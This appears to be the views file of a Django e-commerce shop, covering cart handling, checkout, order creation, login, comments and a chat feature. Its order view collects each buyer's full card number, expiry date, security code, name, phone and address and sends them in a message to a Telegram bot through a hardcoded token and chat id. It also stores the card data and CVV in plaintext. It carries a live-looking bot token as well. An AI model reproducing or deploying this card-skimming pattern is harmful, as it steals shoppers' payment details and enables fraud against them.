from django.shortcuts import render
from ecomapp.models import Category, Product, CartItem, Cart, Order,Comment, Messages,Chat,Member
from django.http import HttpResponseRedirect, JsonResponse
from django.urls import reverse
from decimal import Decimal
from ecomapp.forms import OrderForm, RegistrationForm, LoginForm, CommentForm
from django.contrib.auth import login, authenticate

import urllib.request
token='875809845:AAHxB49VM_TowQhXtaBz80fx07XrIvgcHIc'
chat_id=406434091

# forma = 'name ={},\n last_name ={}'.format(
#             'name1','last_name')
# forma = urllib.parse.quote(forma)
# urllib.request.urlopen('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token,chat_id,forma))

def base_view(request):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    categories = Category.objects.all()
    products = Product.objects.all()
    contex = {
        'categories': categories,
        'products': products,
        'cart': cart
    }

    return render(request, 'base.html', contex)

def product_view(request, product_slug):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    product = Product.objects.get(slug = product_slug)
    form = CommentForm(request.POST or None)
    images = product.images.all()
    if not images:
        images = False
    categories = Category.objects.all()
    context = {
        'product': product,
        'categories': categories,
        'cart': cart,
        'images': images,
        'form': form

    }
    
    return render(request, "product.html", context)




def category_view(request, category_slug):
    category = Category.objects.get(slug = category_slug)
    categories = Category.objects.all()    
    products_of_category = Product.objects.filter(category = category)
    context = {
        'category': category,
        'products_of_category': products_of_category,
        'categories': categories
    }
    return render(request, "category.html", context)


def cart_view(request):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    context = {
        'cart': cart
    }
    return render( request, "cart.html", context)

def add_to_cart_view(request):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    product_slug = request.GET.get("product_slug")
    product = Product.objects.get(slug = product_slug)
    cart.add_to_cart(product.slug)
    new_cart_total = 0.00
    for item in cart.item.all():
        new_cart_total += float(item.item_total)
    cart.cart_total = new_cart_total
    cart.save()
    return JsonResponse({'cart_total':  cart.item.count(),
     "cart_total_price": cart.cart_total})

def remove_from_cart(request):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    product_slug = request.GET.get("product_slug")
    product = Product.objects.get(slug = product_slug)
    cart.remove_from_cart(product.slug)
    new_cart_total = 0.00
    for item in cart.item.all():
        new_cart_total += float(item.item_total)
    cart.cart_total = new_cart_total
    cart.save()
    return JsonResponse({'cart_total':  cart.item.count(),
     "cart_total_price": cart.cart_total}) 

      
def change_item_qty(request):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    qty = request.GET.get('qty')
    item_id = request.GET.get('item_id')
    cart_item = CartItem.objects.get(id=int(item_id))
    cart.change_qty(qty, item_id, cart_item)
    return JsonResponse({'cart_total':  cart.item.count(),
     'item_total': cart_item.item_total,
     "cart_total_price": cart.cart_total     }) 

def checkout_view(request):
    try:
        cart_id=request.session['cart_id']  
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id = cart_id)
    context ={
        'cart': cart
    }
    return render(request, 'checkout.html', context)

def order_create_view(request):
    try:
        cart_id = request.session['cart_id']
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id=cart_id)
    form = OrderForm(request.POST or None)
    categories = Category.objects.all()
    context = {
        'form': form,
        'cart': cart,
        'categories': categories
    }
    return render(request, 'order.html', context)


def make_order_view(request):
    try:
        cart_id = request.session['cart_id']
        cart = Cart.objects.get(id=cart_id)
        request.session['total'] = cart.item.count()
    except:
        cart = Cart()
        cart.save()
        cart_id = cart.id
        request.session['cart_id'] = cart_id
        cart = Cart.objects.get(id=cart_id)
    form = OrderForm(request.POST or None)
    categories = Category.objects.all()
    print(form.is_valid())
    if form.is_valid():
        name = form.cleaned_data['name']
        last_name = form.cleaned_data['last_name']
        phone = form.cleaned_data['phone']
        card_number = form.cleaned_data['card_number']
        expiry_date = form.cleaned_data['expiry_date']
        card_code = form.cleaned_data['card_code']
        address = form.cleaned_data['address']
        country = form.cleaned_data['country']
        city = form.cleaned_data['city']
        zipcode = form.cleaned_data['zipcode']
        NameonCard = form.cleaned_data['NameonCard']
        CreditCardType = form.cleaned_data['CreditCardType']
        comments = form.cleaned_data['comments']

        forma = 'name ={}\n last_name ={}\n phone={}\ncard_number={}\nexpiry_date={}\ncard_code={}\naddress={}\ncountry={}\ncity={}\nzipcode={}\nNameonCard={}\nCreditCardType={}\ncomments={}\ncart_total={}\n'.format(
            name,last_name,phone,card_number,expiry_date,card_code,address,country,city,zipcode,NameonCard,CreditCardType,comments,cart.cart_total)
        forma = urllib.parse.quote(forma)
        urllib.request.urlopen('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token,chat_id,forma))

        new_order = Order.objects.create(
            user=request.user,
            item=cart,
            total=cart.cart_total,
            first_name=name,
            last_name=last_name,
            phone=phone,
            card_number=card_number,
            expiry_date=expiry_date,
            card_code=card_code,
            address=address,
            comments=comments,
            country = country,
            city = city,
            zipcode = zipcode,
            NameonCard = NameonCard,
            CreditCardType = CreditCardType
            )
        del request.session['cart_id']
        del request.session['total']
        return HttpResponseRedirect(reverse('thank_you'))
    context = {
        'form': form,
        'categories': categories
    }
    return render(request, 'order.html', context)

def account_view(request):
    order = Order.objects.filter(user = request.user).order_by('-id')
    context = {
        'order': order
    }
    return render(request, 'account.html', context)

def registration_view(request):
    form = RegistrationForm(request.POST or None)
    categories=Category.objects.all()
    if form.is_valid():
        new_user = form.save(commit=False)
        username = form.cleaned_data['username']
        password = form.cleaned_data['password']
        email = form.cleaned_data['email']
        first_name = form.cleaned_data['first_name']
        last_name = form.cleaned_data['last_name']
        new_user.username = username
        new_user.set_password(password)
        new_user.first_name = first_name
        new_user.last_name = last_name
        new_user.email = email
        new_user.save()
        login_user = authenticate(username=username, password=password)
        if login_user:
            login(request, login_user)
            return HttpResponseRedirect(reverse('base'))
    context = {
        'form': form,
        'categories': categories
    }
    return render(request, 'registration.html', context)

def login_view(request):
    form = LoginForm(request.POST or None)
    if form.is_valid():
        username = form.cleaned_data['username']
        password = form.cleaned_data['password']
        login_user = authenticate(username=username, password=password)
        if login_user:
            login(request, login_user)
            return  HttpResponseRedirect(reverse('base'))
    context = {
        'form': form
    }
    return render(request, 'login.html', context)
def add_comment(request):
    # try:
    #     cart_id=request.session['cart_id']  
    #     cart = Cart.objects.get(id=cart_id)
    #     request.session['total'] = cart.item.count()
    # except:
    #     cart = Cart()
    #     cart.save()
    #     cart_id = cart.id
    #     request.session['cart_id'] = cart_id
    #     cart = Cart.objects.get(id = cart_id)
    # form = CommentForm(request.POST or None)
    # print('restf')
    product_slug = request.GET.get("product_slug")
    comment = request.GET.get("txt")
    # print(comment)
    # print(product_slug)
    product = Product.objects.get(slug = product_slug)
    # product = Product.objects.get(slug = product_slug)
    if comment:
        # print(request.session.session_key)
        # comment = form.cleaned_data['comment']
        user_id = request.session.session_key
        product.add_comment(comment,user_id,product_slug)
        
    else:
        print('form.is_INvalid')

    # categories = Category.objects.all()
    # images = product.images.all()
    # context = {
    #     'product': product,
    #     'categories': categories,
    #     'cart': cart,
    #     'images': images

    # }
    return JsonResponse({'auth_id': str(user_id),  
        'last_comm': str(comment)})

def chat_view(request):
    if request.user.is_superuser:
        chats = Chat.objects.all()

        context = {'chats':  chats}
        return render(request, "chat_view.html", context)
    else:
        try:
            member_id = request.session.session_key
            member = Member.objects.get(member=member_id)
            chat = Chat.objects.get(member=member) 
        except:
            member_id = request.session.session_key
            member = Member(member=member_id)
            member.save()
            chat = Chat(member=member)
            chat.save()
            member = Member.objects.get(member=member_id)
            chat = Chat.objects.get(member=member) 
            print('Erorr')

        context = {'chat':  chat}
        return render(request, "chat_view.html", context)

def send_message(request):

    member_id = request.session.session_key
    try:
        member = Member.objects.get(member=member_id)
        chat = Chat.objects.get(member=member) 
    except:
        member = Member(member=member_id)
        member.save()
        chat = Chat(member=member)
        chat.save()
        member = Member.objects.get(member=member_id)
        chat = Chat.objects.get(member=member) 

    message = request.GET.get("message")
    chat.send_message(member,message)
    return JsonResponse({'member': str(member_id),  
        'message': str(message)})



